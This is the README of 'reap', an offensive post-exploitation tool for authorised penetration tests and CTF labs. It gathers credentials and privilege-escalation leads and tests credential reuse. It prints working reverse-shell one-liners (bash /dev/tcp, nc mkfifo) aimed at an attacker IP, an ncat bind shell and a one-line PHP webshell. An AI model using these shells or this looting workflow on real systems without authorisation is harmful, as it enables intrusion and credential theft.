# reap

```
██████╗ ███████╗ █████╗ ██████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝█████╗  ███████║██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝
██║  ██║███████╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝
```

Post-exploitation loot collection and credential-reuse testing for authorized engagements (penetration tests, HTB/CTF labs).

You get the foothold. reap attaches to it and does the tedious part: it enumerates the host for secrets, configs, keys, and privilege-escalation signals, tests every credential it finds against every service it finds, and gives you a ranked findings list plus a report. It does not exploit anything and it does not decide your pivots — those stay with you.

> reap only tests credentials against services on hosts you register. No external spraying, no targets you didn't provide. Use it on systems you are authorized to assess.

To connect a shell from another tool, start with the [agent quickstart](AGENT_QUICKSTART.md).

## Install

Reap requires Python 3.9 or newer and installs from source. On Kali, install Git and Python's venv support first:

```bash
sudo apt install -y git python3-venv
```

Then:

```bash
git clone https://github.com/Cobrastrike62/reap.git ~/reap
cd ~/reap
bash install.sh --full       # local .venv + all optional backends
source .venv/bin/activate
reap
```

**Prefer a command available from any directory** with no venv to activate? Install via pipx. It puts an editable `reap` on your current user's `PATH`:

```bash
sudo apt install -y pipx && pipx ensurepath   # once; then open a new shell
```

```bash
cd ~/reap
bash install.sh --pipx --full    # current-user command + all backends
```

`--pipx` and `--full` are independent: `--pipx` exposes the command for your current user; `--full` chooses the backends. This does not install Reap for every Linux account. Add `--trusted-host` behind a TLS-intercepting proxy.

`install.sh` options can be combined with one backend selection: `--db`, `--win` or `--full`. Use `--full` for both backend sets. If you supply multiple backend flags, the last one wins.

| flag | effect |
|---|---|
| `--full` | all optional backends (DB logins + SMB/pass-the-hash + GPP decrypt) |
| `--db` | database login backends only (mysql / postgres / mongo / mssql) |
| `--win` | Windows/AD backends only (impacket + cryptography) |
| `--pipx` | install an editable command on your current user's PATH via pipx (no venv to activate) |
| `--with-pwncat` | also set up pwncat-vl in its own venv |
| `--trusted-host` | pass pip `--trusted-host`, for TLS-intercepting proxies |

The optional backends are only used for credential *testing* against those services; reap collects loot without them. Run `bash install.sh --help` for the full list.

To update an existing Kali WSL checkout while retaining its loot databases:

```bash
cd ~/reap
git pull --ff-only
bash install.sh --pipx --full
reap
```

For a local venv, use `bash install.sh --full` and activate `.venv` instead. Keep the source directory at its installed path in both modes: the editable installation imports code from that directory. Moving or deleting it can break the command. If you move the source, rerun the pipx installer from the new location. For a local venv, move the old `.venv` out of the way first and let the installer create a fresh one; venv launchers contain absolute paths.

The agent uses ready-to-use target executables included in a packaged Reap build. It requires no Go installation on Kali or the target. Reap keeps its own Python dependencies on Kali; the target only needs the generated executable. After updating an older checkout, rerun the installer to pick up dependency changes. Existing loot databases are updated automatically when Reap opens them.

### Package Reap for another Kali machine

For the one-file agent, use the prepared `reap-1.13.0.tar.gz` archive supplied with this build. It includes the ready-to-use target files. Follow the [prepared build installation](USAGE.md#install-a-prepared-build-with-the-agent) on a fresh Kali machine.

For a source-only installation, transfer a Git source archive. The destination does not need `.git`. From the source repository, in PowerShell or a Linux shell:

```bash
git archive --format=tar.gz --prefix=reap/ --output=../reap-source.tar.gz HEAD
```

The archive contains the committed files at `HEAD`, including the installer and agent source. It excludes Git history, uncommitted edits and untracked files. Ignored virtual environments and engagement artifacts are excluded unless they were committed. Commit the intended source changes before building a release archive, and check what is tracked with `git ls-files`.

Copy the archive to a fresh Kali instance, install pipx using the prerequisite above, then run:

```bash
tar -xzf /path/to/reap-source.tar.gz -C "$HOME"
cd ~/reap
bash install.sh --pipx --full
reap --help
```

Use a fresh destination directory. For an existing installation, back up the checkout and engagement files before updating its source; do not extract over local edits without reviewing them. Keep `~/reap` after installation. Recreate Python environments on each machine instead of copying `.venv` or pipx environments. The archive contains source, so the installer still downloads dependencies from PyPI; a fully offline installation needs a separate dependency wheelhouse compatible with the destination's Python version and architecture.

If you also want to develop Reap or preserve commits that are not on GitHub, transfer a Git bundle instead. Copying a standalone checkout with `.git` also works, but includes local Git configuration and hooks. A source archive is smaller and sufficient to run Reap. See the [transfer and Git bundle walkthrough](USAGE.md#transfer-reap-to-another-kali-instance) for backup, clone and update instructions. These packages install Reap on your operator machine. A target using the [one-file agent](AGENT_QUICKSTART.md) only needs the generated executable. A Git source archive does not include untracked agent executables; use a packaged Reap build for the ready-to-use agent. See the [developer packaging notes](native-agent/README.md) if you are distributing your own build.

## Quickstart

```
reap --db engagement.db                       # a named store that persists across hosts

reap> register ssh 10.10.10.5 bob 'S3cret!'   # attach to your foothold (auto-fingerprints)
reap> enum                                     # survey the box (processes/cron/services/net)
reap> run                                      # collect loot, then correlate
reap> creds                                    # recovered credentials + confirmed reuse
reap> findings                                 # ranked findings (capabilities first)
reap> !ls -la /root                            # run a command on the target ( or: interact )
reap> report engagement.md                     # write the report
```

Pivoting? `register` the next host too. The loot store persists, so a credential found on one box is tested against every other box you register.

## How it works

reap is built in layers, each depending only on the one below it:

```
Console        register / enum / run / correlate / forward / shell / report
Correlation    credential reuse (incl. pass-the-hash) + capability findings + DB credential-catalog dump
Modules        fingerprint + collection primitives + per-runtime plugins
Loot store     SQLite: hosts, services, credentials, findings
Transport      SSH / WinRM / webshell / pwncat handoff  (one exec contract)
```

Modules never see the transport. They run over a single `Session.exec()` contract, so the same collection works whether the session is SSH, WinRM, a webshell, or a handed-off pwncat shell.

Correlation also **closes the DB loop**: when a discovered credential is confirmed against a MySQL/Postgres/MSSQL/Mongo service, reap reuses that proven login to read the database's own credential catalog (`mysql.user`, `pg_shadow`, `sys.sql_logins`, mongo `system.users`), storing every account hash — tagged with its hashcat mode — as new loot for offline cracking. It reads only the auth catalog, not application data, and you can disable it with `REAP_NO_DBDUMP=1`.

## Attaching to a foothold

Pick the adapter that matches the access you already have:

| Access | Register with |
|---|---|
| SSH password or key | `register ssh <ip> <user> [<pass>] [--key PATH] [--port N]` |
| WinRM | `register winrm <ip> <user> <pass> [--ssl] [--port N]` |
| Web / command-injection RCE | `register webshell <url> [--param NAME] [--method GET\|POST] [--shell sh\|cmd]` |
| Raw reverse shell (nc-style) | `register listen <port>`, then fire your payload — reap catches it |
| Raw bind shell | `register bind <host> <port>` |
| Shell obtained through another tool | `agent` to make one target file, then `agent listen` |

### Using a web shell (HTTP RCE)

The `webshell` adapter turns an HTTP command-execution foothold into a full reap session — no reverse shell required. Every module runs over it unchanged, because it honors the same `exec` contract: reap sends each command as one HTTP request and reads stdout from the response body. Exit codes are recovered from an appended high-entropy sentinel, so a truncated response or a dead shell is reported as a failure rather than a fake success.

Reach for it when your foothold is an **uploaded webshell** (arbitrary file upload into a PHP/JSP/ASPX app) or a **command-injection** endpoint (a page that executes a request parameter). Plant a minimal shell through your RCE, somewhere web-served:

```php
// PHP — the classic; JSP/ASPX equivalents work the same (any page that runs a request param)
<?php system($_REQUEST["cmd"]); ?>
```

Then register the URL and `run` as usual:

```
reap> register webshell http://target/uploads/sh.php
  registered webshell:target (active)
reap> run
```

Flags, when the shell isn't a POSIX `?cmd=` POST:

| Flag | Meaning | Default |
|---|---|---|
| `--param NAME` | the request parameter your shell reads | `cmd` |
| `--method GET` | send via query string instead of POST | `POST` |
| `--shell cmd` | Windows/IIS shell — exit-code wrapper uses `%errorlevel%`, not `$?` | `sh` |

```
reap> register webshell 'http://target/cmd.aspx' --param c --shell cmd     # IIS / ASP.NET
reap> register webshell 'http://target/vuln.php?x=' --param x --method GET  # GET injection
```

Things worth knowing:

- **TLS is not verified** (like `curl -k`) — target webshells are almost always self-signed or IP-based.
- **The web user is usually nologin** (`www-data`, `iis apppool`). That is exactly the case this adapter exists for: reap loots the host over the RCE, then correlation surfaces the credential that gets you a real interactive shell.
- **One request per command**, so a broad sweep can drag under PHP per-request time limits. For large runs prefer the driver: `python reap_run.py 'webshell:http://target/sh.php' engagement.db` (or `webshell:GET:cmd:http://target/sh.php` to set method/param).
- **Don't point it at a blocking shell** — it expects request/response, not a webshell that pipes into a reverse connection.

### Catching a raw shell

Raw shells are driven with sentinel-wrapped commands over the socket (no PTY, so no interactive prompts). reap only runs commands that return, so collection works fine; for stability-sensitive work, upgrade to SSH. Add `--shell cmd` for a Windows `cmd.exe` shell.

reap can be the listener itself — you don't need a separate `nc`. Register the listener *first*, then fire your reverse-shell payload from the target through whatever RCE you have:

```
reap> register listen 4444
  listening on 0.0.0.0:4444 — fire your reverse shell now...
```

Then, on the target (`10.10.14.5` is *your* attacking/VPN IP, `4444` the port you're listening on):

```bash
# Linux, /dev/tcp (bash):
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
# Linux, no /dev/tcp:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

reap catches the connection, auto-fingerprints it, and you `run` as usual — it loots over the caught shell.

For a **bind** shell (the target listens, reap dials in):

```bash
# on the target, e.g. via your RCE:
ncat -lvp 1337 -e /bin/bash          # or the exploit itself opens the port
```
```
reap> register bind 10.10.10.5 1337
```

Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4444 --shell cmd`).

### Connect a shell from another tool

Use the agent when you already have a target shell and want to connect it to Reap. Reap makes one file for that target. Copy that file and run it. The target needs no Go or Python installation.

**On your Kali machine**, open Reap and type:

```text
agent
```

Reap asks for your reachable IP address and the kind of target. In a VPN lab, enter your Kali VPN IP, such as `10.10.14.2`. It then prints the file to copy and the commands to run.

Copy the generated `reap-agent` to the target through the access you already have. Back in **Reap on Kali**, start waiting for it:

```text
agent listen
```

**In the Linux target shell**, in the directory where you copied the file:

```bash
chmod +x reap-agent
./reap-agent
```

For a Windows target, choose Windows during setup, copy `reap-agent.exe`, and run `.\reap-agent.exe` in the target's PowerShell.

When Reap says the target is connected, use `enum` to look around or `run` to collect loot. Keep the target agent running while you work. Use `exit` in Reap or Ctrl-C in the target shell to close the connection.

To skip the setup questions, `agent create 10.10.14.2` makes a Linux agent directly. `agent list` shows saved setups. Reap keeps the connection settings on Kali, so you only transfer the executable.

See the [one-file agent quickstart](AGENT_QUICKSTART.md) for the complete workflow, Windows, and fixes for connection problems. [Agent options](USAGE.md#agent-options-and-saved-setups) cover different ports and saved setups. The [developer notes](native-agent/README.md) cover builds and the older manual connection commands.

## Evidence, coverage and saved enumeration (v1.11)

`enum` now shows confidence labels and check coverage. Connected execution leads show the command source, run-as account, owner, group, mode, effective access check and a suggested next check. Use `enum linked` to focus on this evidence.

A file has one owner and one group. The useful intersection is a file owned by root whose group includes your user, or a root-owned file you can modify or replace. Ownership alone does not establish a privilege escalation path. The new `linked_evidence` module joins absolute paths from cron and service definitions to permissions checked as the session account. It checks whether a parent is writable, searchable and non-sticky, and accounts for immutable or append-only file attributes when available. Service accounts come from the effective systemd User property when available; otherwise the declaration is an inference.

For example, a root cron referencing `/opt/backup.sh` can produce:

```text
E1
/opt/backup.sh
  /etc/cron.d/backup references this file as root; your session can modify the file
  [confidence: observed]
  Execution source: /etc/cron.d/backup
  Run-as account: root
  Command: * * * * * root /opt/backup.sh
  Ownership/mode: root:developers 660
  Session access check: can modify the file
  Next check: Verify activation, mount options, ACLs and runtime use before concluding exploitability.
```

`observed` describes evidence returned by the target. `inferred` describes a heuristic or an account taken from a declaration rather than effective configuration. Neither label promises a working exploit. Version-based sudo leads ask you to check distro advisories and backported fixes. Custom files named `passwd` outside `/etc` are not classified as the system password database. SSH-key location hints use the target's HOME rather than the operator's.

```text
reap> enum                       # leads, full listings and check coverage
reap> enum linked                # connected execution/permission leads
reap> enum --brief               # hide raw listings; keep leads and coverage
reap> show E1                    # full evidence from the latest enum
reap> enum --save                # persist the complete returned survey
reap> enum --diff                # compare with the latest saved baseline
reap> enum --diff --save         # compare, then save the new baseline
reap> show snapshot 1            # saved survey, including coverage
reap> show 12                    # full evidence for stored finding 12
```

Ordinary `enum` remains screen-only. `--save` stores sections, leads, full returned lines and coverage separately from ranked findings. Snapshot IDs survive restarting Reap. `E1` identifiers refer to the latest enum in the current console. `run` persists actionable findings, collects credentials and runs correlation. Markdown reports retain full finding details; `findings` is a compact table and `show <id>` expands it. JSON exports include saved snapshots and coverage.

`--diff` compares facts, leads and coverage with the latest saved snapshot for the same host and scope. A filter such as `cron` has its own baseline; `--probe` also creates a separate scope. `--brief` only changes presentation. `--diff` alone does not save. Changed process IDs, timestamps printed by tools and live socket changes can produce ordinary differences.

The coverage table distinguishes completed checks, partial responses, missing tools, permission failures, timeouts and reached result caps. A completed bounded check describes its returned scope; it does not mean the whole host was examined. An empty response from a failed check is not evidence that nothing exists. Reap no longer calls the machine stock when no leads were returned.

Filesystem checks use selected roots, caps and some depth limits. Set `REAP_ENUM_FULLFS=1` on the operator before starting Reap for a wider sweep; pseudo-filesystems remain pruned. Permission-escalation checks are skipped when the session already runs as root. Connected evidence checks at most 60 parsed absolute-path references. Shell expansions, relative paths, complex quoting and generated unit commands can require manual inspection.

### Service identification on discovered ports

```text
reap> ports
reap> ports --probe               # identify discovered TCP endpoints
reap> enum --probe --save         # include identification in a saved survey
reap> forward 127.0.0.1 3000       # IPv4 loopback web service
reap> forward ::1 3000            # IPv6 loopback service
```

Socket rows preserve bind address, address family, transport, process and PID when exposed by the source. Two processes listening on different addresses at port 3000 remain separate. IPv6 `::1` stays IPv6. UDP sockets do not enter TCP credential checks or TCP auto-forwards, and loopback forwarding keeps each session and actual bind address separate.

Without `--probe`, service names are guesses from a port or process. With `--probe`, Reap uses negotiated native probing on a Linux native-agent session, or a Python standard-library probe on other Linux sessions. It can return HTTP status, page title, Server header, redirect destination, banners, TLS protocol and certificate SHA-256 fingerprint. HTTP on an alternate port becomes an observed lead.

Identification selects at most 12 discovered TCP endpoints by default, with a hard ceiling of 24, and uses a 55-second overall budget with short operation deadlines. Native probing shares a 64 KiB read allowance per endpoint across plain/TLS attempts; the Python fallback caps each response at 64 KiB. Redirects are recorded without following them. Probing does not scan additional ports or neighbouring hosts. TLS metadata is observational, including self-signed certificates, and does not verify service identity. Failed requests and caps appear in coverage. Linux native sessions need no target Python; other Linux sessions retain the Python requirement. Windows service probing remains unsupported.

### Password and hash exports

```text
reap> export creds lab
reap> export hashes lab-hashes
reap> export json lab-report.json
```

`export creds <prefix>` writes user, password and user/password lists. Usernames can come from any credential record; password lists contain only password credentials. Hashes, tokens, SSH keys and capabilities do not become password guesses. Multiline passwords cannot be represented in these line-based files and are excluded; JSON retains the original record.

`export hashes` groups supported records into files such as `lab-hashes-m300.txt` and `lab-hashes-m12.txt`, plus `lab-hashes-manifest.json`. The manifest maps credential IDs and usernames to files, explains each format, and lists unsupported or malformed records with a reason. It does not run a cracker.

Supported formats include MySQL native authentication, PostgreSQL MD5 and SCRAM, MongoDB SCRAM server keys, MSSQL 2005/2012 verifiers, explicitly identified NTLM, bcrypt and Unix MD5/SHA-256/SHA-512 crypt. MySQL's leading `*` is removed; PostgreSQL MD5 includes the username salt. MongoDB uses base64 usernames, star separators and **serverKey**, matching the [Hashcat format reference](https://hashcat.net/wiki/doku.php?id=example_hashes). Ambiguous bare MD5/NTLM digests, unsupported algorithms and old MongoDB stored-key records are listed as skipped rather than assigned a guessed mode. Recollect legacy Mongo records with this version.

## Looking around the box

Once a session is registered you have two ways to work the host by hand, both from the reap prompt over the session you already hold: `enum` to survey it, and `!` / `interact` to run commands on it.

### `enum` — enumeration, linpeas-style

`enum` surveys the active session, **flags what looks out of place**, and prints the full picture to the screen. It covers:

| Category | Collector | What you get |
|---|---|---|
| Processes | `processes` | full process list (kernel threads filtered), so you can spot creds on command lines and root-owned processes running out of writable paths |
| Cron / scheduled jobs | `cron_jobs` | every source: `/etc/crontab`, `/etc/cron.d`, the hourly/daily/weekly/monthly run-parts dirs, per-user crontabs, the spool, and `systemd` timers |
| Services | `init_services` | running services, enabled-at-boot services, and the SysV/`init.d` fallback |
| Privilege escalation | `sudo_privesc` | `sudo -l` NOPASSWD rules, non-standard SUID (GTFOBins candidates), dangerous file capabilities, writable cron files |
| Files & permissions | `interesting_files` | writable `$PATH` dirs, **root-owned files you can write / are group-writable in your group / sit in a dir you can write**, readable SSH private keys, world-writable, files you own in system locations |
| System & network | `system_snapshot` | kernel, distro, uptime, sudo version, `PATH`, users, **dangerous group membership + container / docker-socket access**, interfaces, routes, **listening sockets**, established connections, ARP, DNS |
| Windows | `windows_enum` | services (logon account + binary path), scheduled tasks, and processes with full command lines |

Each section leads with a **⚑ worth a look** block — the items reap thinks are *out of place*, each with a one-line reason — followed by the full raw listing (dimmed, for completeness). At the end, `enum` prints a **summary** of everything flagged across every section, split into *worth acting on* (red) and *worth a look* (yellow), so you get a punch-list instead of a wall of text.

The heuristic doing most of the work: anything running from — or referencing — a path **outside the base system** (`/opt`, `/home`, `/srv`, `/usr/local`, `/tmp` …). That's where the target app, an operator's custom daemon, or a dropped payload lives, while the distro's own files sit in `/usr`,`/bin`,`/sbin`,`/lib`. On top of that it flags:

- **root-owned things you can influence** — a root file you can write, one that's *group-writable and you're in the group*, or one sitting in a *directory you can write* (rename it away, drop your own). Writable `/etc/passwd` / `/etc/shadow` / `/etc/sudoers` are called out loudly.
- **a fast path via your groups** — membership in `docker`, `lxd`, `disk`, `shadow`, `sudo`/`wheel`, `adm`; a **writable `docker.sock`**; or the fact that you're **in a container** (with escape hints).
- **privesc signals** — `sudo -l` NOPASSWD, non-standard SUID (GTFOBins), dangerous capabilities, writable cron.
- **the rest** — secrets on command lines, operator/attacker tools (`nc`, `socat`, `tmux`, `tcpdump` …), vulnerable `sudo` (Baron Samedit &c.), the kernel (with a `searchsploit` pointer), extra UID-0 accounts, writable `$PATH` dirs, readable SSH private keys, and loopback / exposed services.

```
reap> enum
──────────────── Privilege context (groups / container) ───────────
⚑ worth a look:
  ! member of group 'docker'  — docker group → mount the host fs as root via a container
──────────────────────────── Processes ────────────────────────────
⚑ worth a look:
  ! www-data 1841 node /opt/app/server.js --db-pass hunter2  — secret on the command line
  full listing:
  root 1 /sbin/init  … (dimmed full ps output) …
────────────── Root-owned files writable via your group ───────────
⚑ worth a look:
  ! /opt/app/shared/config.rb  — root-owned & group-writable via your 'devs' group
─────────────────────────────── System ───────────────────────────
⚑ worth a look:
  ! Sudo version 1.8.21p2  — CVE-2021-3156 'Baron Samedit' heap overflow → root
  • kernel 5.15.0-generic  — check 'searchsploit linux kernel 5.15' for a local-root exploit
──────────────────── enum summary — 5 thing(s) stood out ──────────
! worth acting on (4):
   member of group 'docker' (Privilege context) — mount the host fs as root via a container
   www-data 1841 node /opt/app/... (Processes) — secret on the command line
   /opt/app/shared/config.rb (…your group) — root-owned & group-writable via 'devs'
   Sudo version 1.8.21p2 (System) — CVE-2021-3156 'Baron Samedit' → root
• worth a look (1):
   kernel 5.15.0-generic (System) — check 'searchsploit linux kernel 5.15'
```

Narrow it to one area by passing a filter that matches a collector name:

```
reap> enum cron        # just the cron sources
reap> enum proc        # just processes
reap> enum system      # kernel, users, and the network sections (system_snapshot)
```

**Ordinary `enum` is screen-only; `enum --save` stores a separate snapshot.** It does not clutter ranked `findings`. The same collectors, run as part of `run`, persist the actionable subset as findings —

- a secret on a process / cron / service command line → a **credential** (and it's fed straight into correlation);
- a **writable** `systemd` unit file, a writable binary named in an `ExecStart=`, or a writable file a cron job executes → a **high** misconfig (classic privesc);
- a writable directory in `$PATH`, or a **root-owned file you can write** → a **high** misconfig;
- an unquoted Windows service path with a space → a **medium** misconfig.

So in the sample above, `enum` just shows you the `deploy` process; `run` turns that `--db-pass hunter2` into a stored credential that correlation then sprays against every service it knows about.

The permission sweep (`interesting_files`) is **scoped and fast** by default — a curated set of roots plus `$PATH`, pruning the pseudo-filesystems. It focuses on what *you* can write, because "writable by root" is meaningless (root writes everything) and "owned by root" is most of the disk; the escalation gold is the intersection — a root-owned file the current user can write. Set `REAP_ENUM_FULLFS=1` to sweep the entire tree like linpeas (slower and noisier — think twice over a raw shell or webshell). Running as root the sweep is skipped, since every path is writable anyway.

Unlike the opt-in LinPEAS/WinPEAS wrappers, `enum` needs **nothing on disk** — no binary to upload, drop, or clean up. It runs over the same `exec` channel as everything else, so it works identically over SSH, WinRM, a webshell, or a caught raw shell.

### `ports` — every listening socket, reliably

`ports` combines separate IPv4/IPv6 **`ss`** checks, **`netstat`**, and **`/proc/net/{tcp,tcp6,udp,udp6}`**. Procfs provides a fallback when socket tools are absent. It sees the session's network namespace; restricted procfs, containers, missing tools, permissions and short-lived listeners can limit results. Source status stays visible even when fallback discovery succeeds. A local listening socket also does not prove that a firewall permits access from the operator machine.

```
reap> ports
                Listening sockets — ssh:bob@10.10.10.5:22
 L4    Port   Bind                    Service    Process
 tcp   22     0.0.0.0                  ssh        sshd
 tcp   3000   127.0.0.1  (loopback)    http       node
 tcp   5432   127.0.0.1  (loopback)    postgres   postgres
 2 loopback-only — reach with 'forward 127.0.0.1 <port>' (run auto-forwards DB/SSH/etc.)
```

Loopback-only listeners (a dev server or DB bound to `127.0.0.1`) are flagged, because those are the ones you can't reach from your box until you `forward` them — and `run` auto-forwards the correlate-able ones. The same listener set feeds the `listening_services` collector, so every port also becomes a Service the correlation engine tests credentials against.

### `!<cmd>` and `interact` — a shell on the target

You're shelled into the box; sometimes you just want to `ls`, `cd`, and `cat` around without leaving reap. Two ways:

**One-off** — prefix any command with `!` (or `shell`). It runs on the active session and prints the output:

```
reap> !id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
reap> !cat /etc/passwd
reap> !find / -perm -4000 -type f 2>/dev/null
```

**Interactive** — `interact` drops you into a remote prompt where you type commands normally until you `exit` (or press Ctrl-D):

```
reap> interact
interacting with ssh:bob@10.10.10.5:22 — 'exit' or Ctrl-D returns to reap. (line-based; no PTY)
10.10.10.5:~$ cd /var/www/html
10.10.10.5:/var/www/html$ ls
config.php  index.php  uploads
10.10.10.5:/var/www/html$ grep -i pass config.php
$db_pass = 'S3cr3tDBpw!';
10.10.10.5:/var/www/html$ exit
reap>
```

Notice the prompt tracked the directory across commands. reap keeps a **virtual working directory per session**, so `cd` persists — even over SSH, whose `exec` channel is otherwise a fresh shell on every command (a naive `cd` would be forgotten the moment it returned). A `cd` into a directory that doesn't exist is rejected and leaves your current directory unchanged. The same cwd is shared by `!` one-offs and `interact`.

It's **line-based, with no PTY**: send-a-command, read-the-output. Programs that need a terminal — `top`, `vi`/`nano`, an interactive `sudo` password prompt, `ssh` — won't work. For those, stabilize the shell in pwncat-vl and drop your key. Everything that runs and returns (the 99% you actually use for looking around) works fine. Type an unknown command at the `reap>` prompt and it'll remind you to prefix it with `!` or use `interact`.

## Commands

| command | description |
|---|---|
| `register <adapter> …` | attach to a foothold and fingerprint it |
| `sessions` / `use <id>` / `hosts` | list sessions / switch the active one / list discovered hosts |
| `fingerprint [id]` | re-probe OS, privilege, runtimes |
| `run [id]` | collect loot, then correlate |
| `enum [filter] [--save] [--diff] [--probe] [--brief]` | survey, connected evidence, coverage and optional saved comparisons |
| `ports [session] [--probe]` | distinct target socket binds, source coverage and optional service identification |
| `!<cmd>` / `shell <cmd>` / `interact` | run commands on the target — one-off, or a line-based remote shell (`cd` persists) |
| `correlate` | re-test credentials against services (incl. pass-the-hash); on a confirmed DB login, dump its credential catalog to loot |
| `forward <rhost> <rport> [lport]` | tunnel a target-internal service to localhost over the SSH session |
| `forwards` / `unforward <lport>` | list / close port forwards |
| `creds` | credentials and their verified reuse |
| `findings` (alias `loot`) | ranked findings |
| `search <regex>` / `note <id> <text>` | search findings / annotate one for the report |
| `report [file] [redact]` | write findings and timeline to markdown (`redact` masks secrets) |
| `export <creds\|hashes\|targets\|json> [path]` | password lists, per-mode hashes, target lists, or JSON |
| `show <id\|E1>` / `show snapshot <id>` | full finding, latest enum lead, or saved survey |
| `agent` | guided setup: make one file to copy to the target |
| `agent create <your-IP> [--target linux\|linux-arm64\|windows]` | make a target file without the setup questions |
| `agent listen [NAME]` | wait for the latest agent, or a saved setup by name |
| `agent list` / `agent show [NAME]` | find saved setups / show their copy-and-run instructions |
| `import <nmap.xml>` | seed services from an nmap scan |
| `modules` | which modules match the active context |

## Reaching internal services

Services bound to a target's localhost — a database, an admin panel, a second SSH — aren't reachable from your machine. reap tunnels to them over the session it already holds:

```
reap> forward 127.0.0.1 3306          # the foothold's own loopback MySQL
reap> forward 10.10.20.50 22 2222     # a second host, only reachable from the foothold
reap> forwards                         # list active tunnels;  unforward <port> closes one
reap> correlate                        # tests discovered creds against the forwarded service
```

The forwarded local port is registered as a service, so `correlate` and any adapter reach it. On `run`, reap also **auto-forwards** loopback-bound databases and services it discovers. How the tunnel is built depends on the session:

- **SSH** — in-process, via paramiko `direct-tcpip` (like `ssh -L`, no second terminal).
- **Raw reverse/bind shell** — a raw shell is a single command channel and can't multiplex TCP, so reap stands up a **chisel reverse tunnel**: it runs a chisel server on your box and, through the shell, has the target fetch chisel and run a client that dials **back out** to you (so the target's firewall doesn't block it). Needs `chisel` on your box (`apt install chisel`, or `REAP_CHISEL=/path`), `wget`/`curl` on the target, and — if reap guesses the callback IP wrong — `REAP_LHOST=<your-ip>`.

## Extending

A new runtime is a plugin file, plus optionally an entry in `reap/data/known_filenames.txt`. Nothing else changes.

```python
# reap/modules/plugins/myapp.py
from ..base import Module, register
from ...patterns import scan_line


@register
class MyAppPlugin(Module):
    name = "myapp_plugin"

    def triggers(self, ctx):
        return ctx.os == "linux" and ctx.has_runtime("python")

    def collect(self, session):
        out = session.exec("cat /etc/myapp/secrets.conf 2>/dev/null").stdout
        return scan_line(out, "/etc/myapp/secrets.conf")
```

Drop the file in `reap/modules/plugins/` and it's picked up on the next `run`. Offline tests run with `pytest -q`.

## Layout

```
reap/
  transport/   session adapters (ssh, winrm, webshell, pwncat) + local forwarding
  store/       SQLite schema and loot store
  modules/     collection primitives, runtime plugins, enumeration wrappers
  data/        known-filename list (data, not code)
  fingerprint.py  correlation.py  reporter.py  console.py  patterns.py
```

## License

MIT — see [LICENSE](LICENSE).
